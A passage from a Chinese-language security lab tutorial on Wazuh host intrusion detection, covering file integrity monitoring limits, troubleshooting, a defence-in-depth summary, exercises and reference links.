- 如果攻击者在两次扫描之间快速完成操作并清除痕迹（在 30 秒内），FIM 仍然会检测到文件的变化——因为扫描是完整的目录遍历，不是增量监控。但如果攻击者能够在下一次扫描之前将文件恢复到原来的状态（散列值不变），那么 FIM 就不会产生告警。

在生产环境中，可以使用 `realtime` 模式（基于 inotify，仅 Linux）实现接近实时的检测，或者使用 `whodata` 模式（基于 auditd）记录"谁修改了文件"。但如前所述，本实验的容器化环境不支持这些高级模式。

### 4.7.4 基线建立的时间窗口

FIM 的基线扫描需要时间——尤其是监控大量文件时。在基线扫描完成之前：

- 文件变化可能不被检测。
- 扫描期间的文件修改可能被当作"正常状态"收录。

**这就是为什么在实验中我们需要先等待 "scan ended" 日志，再执行篡改操作。**

### 4.7.5 Agent 本身的安全性

Wazuh Agent 部署在受监控的主机上。如果攻击者获得了主机的 root 权限，他理论上可以：

- 停止或卸载 Agent。
- 修改 Agent 的配置（如果配置文件在本地）。
- 清除 Agent 的本地缓存。

因此，HIDS 的安全性本身也依赖于主机的访问控制。这也是为什么需要多层防御——不能把所有鸡蛋放在一个篮子里。

## 4.8 常见问题与排查

### 4.8.1 Agent 无法连接到 Manager

**症状**：`docker compose logs wazuh-agent` 中反复出现连接失败的日志。

**排查方向：**

1. 确认两个服务在同一个 Docker 网络中（`hids-net`）。
2. 确认 Manager 的 1514 和 1515 端口已暴露。
3. 确认 Agent 配置中的 `<address>wazuh-manager</address>` 正确。
4. 等待 Manager 完全启动后再启动 Agent（`depends_on` 只保证启动顺序，不保证服务就绪）。

### 4.8.2 看不到 FIM 告警

**可能的原因：**

1. **基线扫描尚未完成**：等待 "scan ended" 日志。
2. **篡改发生在监控范围之外**：确认文件路径在 `<directories>` 指定的目录下。
3. **文件在 `ignore` 列表中**：检查配置中的排除规则。
4. **告警尚未上报到 Manager**：等待 Agent 与 Manager 之间的通信同步（通常几秒内完成）。
5. **Agent 未成功注册到 Manager**：检查 Agent 日志中是否有 "Successfully connected to manager"。

### 4.8.3 告警太多，无法分析

在生产环境中，FIM 可能会产生大量告警。常见原因：

- 监控范围过大（如监控整个 `/`）。
- 没有排除频繁变化的目录（如 `node_modules`、`logs`、临时文件）。
- 应用本身频繁更新文件（如缓存目录）。

**建议**：从最小的必要监控范围开始，根据实际需求逐步扩大。利用 `ignore` 排除已知的高频变更目录。

## 4.9 本章总结

### 4.9.1 本章核心知识

1. **完整性**是信息安全三要素之一，解决"文件是否被未授权篡改"的问题。
2. **散列函数**提供文件的"数字指纹"，用于检测变化，但不能确认来源。
3. **数字签名**同时解决完整性和来源认证，基于公钥密码学。
4. **PKI** 通过证书链和 CA 体系解决"公钥可信性"问题。
5. **GPG** 是 OpenPGP 的开源实现，广泛用于软件签名验证。
6. **可信计算**（TPM、Secure Boot）从硬件层面建立信任链，逐级验证启动过程。
7. **HIDS** 从主机内部观察安全事件，弥补了 WAF 和 NIDS 的盲区。
8. **FIM** 通过基线扫描和对比检测文件变化，是 HIDS 的核心功能。
9. **Wazuh 的集中式架构**：Agent 负责采集和上报，Manager 负责解析和告警生成。
10. **文件变化不等于被入侵**：FIM 告警需要结合上下文分析。

### 4.9.2 纵深防御的视角

从 CISO 的视角来看，本章的关键收获是：

> **安全不是"装了一个工具就安全了"，而是建立多层异构的检测和防护体系。** WAF 负责 HTTP 层，NIDS 负责网络层，HIDS 负责主机层。每一层都有盲区，但多层叠加后，攻击者的盲区就会大幅缩小。

### 4.9.3 与下一章的衔接

HIDS 已经上线，文件变化可以检测到了。但你很快会遇到一个新的问题：

**你现在有四个安全组件，每个都在产生日志。**

- WAF 日志（ModSecurity）。
- Suricata 告警（EVE JSON）。
- Wazuh Agent FIM 告警。
- 应用访问日志。

当攻击者同时触发多个组件的告警时，你如何把这些告警**关联**起来，还原出完整的攻击链？

下一章，我们将部署 **SIEM（安全信息和事件管理）平台**，将所有日志集中到一个平台进行关联分析。

## 4.10 练习

1. **扩展监控范围**：修改 `ossec.conf`，增加对 `/etc` 目录的监控，验证 FIM 是否能够检测到 `/etc/passwd` 的变化。

2. **对照实验**：在监控范围内创建一个正常文件（如 `touch /monitored/juice-shop/test.txt`），在监控范围外创建另一个文件（如 `docker exec wazuh-agent touch /tmp/test.txt`），观察 FIM 对两者的不同反应。

3. **基线时间窗口分析**：在 FIM 扫描期间（"scan ended" 日志出现之前）修改文件，观察是否会漏报。记录漏报的原因。

4. **思考题**：如果攻击者在修改文件后，将文件的散列值恢复到原来的值（例如先备份原始文件，篡改后再恢复），FIM 是否能够检测到？为什么？（提示：考虑 mtime 和 inode 属性。）

## 4.11 参考资料

| 文档 | 链接 |
|------|------|
| Wazuh FIM 官方文档 | https://documentation.wazuh.com/current/user-manual/capabilities/file-integrity/index.html |
| FIM 配置指南 | https://documentation.wazuh.com/current/user-manual/reference/ossec-conf/syscheck.html |
| FIM 告警 Rule ID | https://documentation.wazuh.com/current/rule-reference/ruleset-fim.html |
| Wazuh Agent 安装 | https://documentation.wazuh.com/current/installation-guide/wazuh-agent.html |
| Wazuh 架构 | https://documentation.wazuh.com/current/getting-started/architecture.html |
| MITRE ATT&CK T1565.001 | https://attack.mitre.org/techniques/T1565/001/ |
| NIST SP 800-174 (TPM) | https://csrc.nist.gov/publications/detail/sp/800-174/final |
| UEFI Secure Boot | https://learn.microsoft.com/en-us/windows-hardware/design/device-experiences/oem-secure-boot |
